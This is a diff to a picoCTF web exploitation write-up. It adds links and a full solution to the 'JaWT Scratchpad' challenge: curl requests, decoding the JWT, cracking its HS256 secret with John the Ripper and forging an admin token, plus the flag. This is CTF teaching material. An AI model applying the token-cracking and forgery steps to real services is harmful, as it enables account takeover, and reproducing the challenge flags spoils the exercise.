@@ -34,7 +34,19 @@ Web Exploitation entails the manipulation of websites and web hosted services us
 | [web crawlers](https://en.wikipedia.org/wiki/Web_crawler). | Web Crawlers Wikipedia page. |
 | [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) | SQL Injection Wikipedia page. |
 | [beautifier.io](https://beautifier.io/) | Code formatting tool. |
-
+| [user agent](https://en.wikipedia.org/wiki/User_agent) | User agent Wikipedia page. |
+| [sqlmap](http://sqlmap.org/) | SQLMap homepage. |
+| [SQLite v3](https://sqlite.org/version3.html) | SQLite v3 homepage. |
+| [Nginx](https://www.nginx.com/) | Nginx homepage. |
+| [sqlmap man](http://manpages.org/sqlmap) | SQLMap man page. |
+| [PBKDF2](https://en.wikipedia.org/wiki/PBKDF2) | PBKDF2 Wikipedia page. |
+| [SHA1](https://en.wikipedia.org/wiki/SHA-1) | SHA1 Wikipedia page. |
+| [crackstation.net](https://crackstation.net/) | Reverse hash lookup site. |
+| [SQL3i CS](http://atta.cked.me/home/sqlite3injectioncheatsheet) | SQLite 3 injection cheatsheet. |
+| [libpng](http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html) | PNG Specifications. |
+| [JSON Web Tokens](https://jwt.io/) | JWT homepage. |
+| [PyJWT](https://pyjwt.readthedocs.io/en/stable/) | PyJWT library homepage. |
+| [John the Ripper](https://en.wikipedia.org/wiki/John_the_Ripper) | John the Ripper homepage. |
 
 ---
 
@@ -834,9 +846,9 @@ function verify() {
 }
 ~~~
 
-</details>
-
 This can be deconstructed to reveal the flag picoCTF{not_this_again_ef49bf}.
+
+</details>
 
 ### Answer
 
@@ -1304,7 +1316,235 @@ Check the admin scratchpad! https://jupiter.challenges.picoctf.org/problem/61864
 
 <summary markdown="span">Solution 1</summary>
 
-Solution here
+We can visit the challenge website and view the source code:
+
+~~~html
+<!DOCTYPE html>
+<html>
+  <title>JaWT - an online scratchpad</title
+  ><link rel="stylesheet" href="/static/css/stylesheet.css" />
+  <body>
+    <header>
+      <h1>JaWT</h1>
+      <br /><i
+        ><small>powered by<a href="https://jwt.io/">JWT</a></small></i
+      >
+    </header>
+    <div id="main">
+      <article>
+        <h1>Welcome to JaWT!</h1>
+        <p>
+          JaWT is an online scratchpad, where you can "jot" down whatever you'd
+          like! Consider it a notebook for your thoughts.<b style="color:#00f"
+            >JaWT works best in Google Chrome for some reason.</b
+          >
+        </p>
+        <p>
+          You will need to log in to access the JaWT scratchpad. You can use any
+          name, other than<code>admin</code>... because
+          the<code>admin</code>user gets a special scratchpad!
+        </p>
+        <br />
+        <form action="#" method="POST">
+          <input type="text" name="user" id="name" />
+        </form>
+        <br />
+        <h2>Register with your name!</h2>
+        <p>
+          You can use your name as a log in, because that's quick and easy to
+          remember! If you don't like your name, use a short and cool one like<a
+            href="https://github.com/magnumripper/JohnTheRipper"
+            >John</a
+          >!
+        </p>
+      </article>
+      <nav></nav>
+      <aside></aside>
+    </div>
+    <script>
+      window.onload=function(){document.getElementById("name").focus()}
+    </script>
+  </body>
+</html>
+~~~
+
+We can see from the above, the webpage uses [JSON Web Tokens](https://jwt.io/) to authenticate logins to the website.
+
+Further, the account user "admin" is described to have a special scratchpad.  We can assume this is where the flag will be hidden.
+
+If we try to log in using the admin account, we get the message "YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT.":
+
+~~~shell
+$ curl "https://jupiter.challenges.picoctf.org/problem/61864/#" --data "user=admin" -H "Content-Type: application/x-www-form-urlencoded"
+<!doctype html>
+<html>
+  <body>
+    <div id="main">
+      <article>
+        <p style="color:red">
+          YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT.
+        </p>
+      </article>
+    </div>
+  </body> 
+</html>                                                                             
+~~~
+
+Logging in with a "test" user, we get a redirect:
+
+~~~shell
+$ curl "https://jupiter.challenges.picoctf.org/problem/61864/#" --data "user=test" -H "Content-Type: application/x-www-form-urlencoded"
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.       
+~~~
+
+We can look at a verbose response using the -v flag:
+
+~~~shell
+$ curl "https://jupiter.challenges.picoctf.org/problem/61864/#" --data "user=test" -H "Content-Type: application/x-www-form-urlencoded" -v
+*   Trying 3.131.60.8:443...
+* Connected to jupiter.challenges.picoctf.org (3.131.60.8) port 443 (#0)
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*  CAfile: /etc/ssl/certs/ca-certificates.crt
+*  CApath: /etc/ssl/certs
+* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-CHACHA20-POLY1305
+* ALPN, server accepted to use http/1.1
+* Server certificate:
+*  subject: CN=jupiter.challenges.picoctf.org
+*  start date: Feb 23 18:02:51 2021 GMT
+*  expire date: May 24 18:02:51 2021 GMT
+*  subjectAltName: host "jupiter.challenges.picoctf.org" matched cert's "jupiter.challenges.picoctf.org"
+*  issuer: C=US; O=Let's Encrypt; CN=R3
+*  SSL certificate verify ok.
+> POST /problem/61864/ HTTP/1.1
+> Host: jupiter.challenges.picoctf.org
+> User-Agent: curl/7.74.0
+> Accept: */*
+> Content-Type: application/x-www-form-urlencoded
+> Content-Length: 9
+> 
+* upload completely sent off: 9 out of 9 bytes
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 302 FOUND
+< Server: nginx
+< Date: Mon, 15 Mar 2021 12:52:59 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 209
+< Connection: keep-alive
+< Location: https://jupiter.challenges.picoctf.org/
+< Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCJ9.IAu_YSHppFe8hXH_BSPb4OLJYGUi8wXqXdS0T33cKbA; Path=/
+< Strict-Transport-Security: max-age=0
+< 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+* Connection #0 to host jupiter.challenges.picoctf.org left intact
+<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.  
+~~~
+
+We can see a cookie is set in the response:
+
+~~~shell
+Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCJ9.IAu_YSHppFe8hXH_BSPb4OLJYGUi8wXqXdS0T33cKbA; Path=/
+~~~
+
+This is the JSON Web Token access token generated at login.  We can use the [PyJWT](https://pyjwt.readthedocs.io/en/stable/) library to decode the access token without verifying of the signature:
+
+~~~py
+import jwt
+
+encoded_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCJ9.IAu_YSHppFe8hXH_BSPb4OLJYGUi8wXqXdS0T33cKbA"
+
+decoded_jwt = jwt.decode(encoded_jwt, options={"verify_signature": False})
+
+print(decoded_jwt)
+~~~
+
+This provides the response:
+
+~~~shell
+In [1]: runfile('JaWT_scratchpad.py')
+{'user': 'test'}
+~~~
+
+We need to generate an authenticated JWT for {"user"; "admin"}.  We can decode the base64 JWT token in Python:
+
+~~~py
+import base64 as b64
+
+base64_jwt = encoded_jwt.split(".")
+bytes_jwt_1 = b64.b64decode(base64_jwt[0])
+bytes_jwt_2 = b64.b64decode(base64_jwt[1])
+hex_jwt_1 = bytes_jwt_1.hex()
+hex_jwt_2 = bytes_jwt_2.hex()
+bytes_jwt_3 = b64.urlsafe_b64decode(base64_jwt[2]+"==")
+hex_jwt_3 = bytes_jwt_3.hex()
+
+
+print(bytes_jwt_1.decode())
+print(bytes_jwt_2.decode())
+~~~
+
+This provides a printable ascii string for the first two parts of the JWT:
+
+~~~shell
+In [1]: runfile('JaWT_scratchpad.py')
+{"typ":"JWT","alg":"HS256"}
+{"user":"test"}
+~~~
+
+This shows the token is JWT and uses hashing algorithm HS256 to generate the signature.  We can generate an ascii string formatted for John the Ripper in python:
+
+~~~py
+data = base64_jwt[0] + "." + base64_jwt[1]
+signature = "#"+hex_jwt_3
+
+string_for_john = data+signature
+
+print(string_for_john)
+~~~
+
+We can crack the hashing secret using [John the Ripper](https://en.wikipedia.org/wiki/John_the_Ripper):
+
+~~~shell
+$ john JaWT_scratchpad.john --wordlist=~/dicts/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+ilovepico        (?)
+1g 0:00:00:04 DONE (2021-03-15 13:46) 0.2028g/s 1500Kp/s 1500Kc/s 1500KC/s ilovetitor..ilovemymother@
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+~~~
+
+The hashing secret is "ilovepico".  We can now generate a new JWT using the username admin:
+
+~~~py
+new_jwt = jwt.encode({"user": "admin"}, "ilovepico", algorithm="HS256")
+print(new_jwt)
+~~~
+
+This gives us the cookie value: 
+
+~~~
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
+~~~
+
+We can edit the cookie in Firefox and we get the string picoCTF{jawt_was_just_what_you_thought_1ca14548}.
 
 </details>
 
@@ -1315,7 +1555,7 @@ Solution here
 <summary markdown="span">Flag</summary>
 
 ~~~
-picoCTF{}
+picoCTF{jawt_was_just_what_you_thought_1ca14548}
 ~~~
 
 </details>
@@ -2077,5 +2317,7 @@ picoCTF{59d5db659865190a07120652e6c77f84}
 ### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
 
 ---
+
+Last updated 15 March 2021.
 
 ## [djm89uk.github.io](https://djm89uk.github.io)
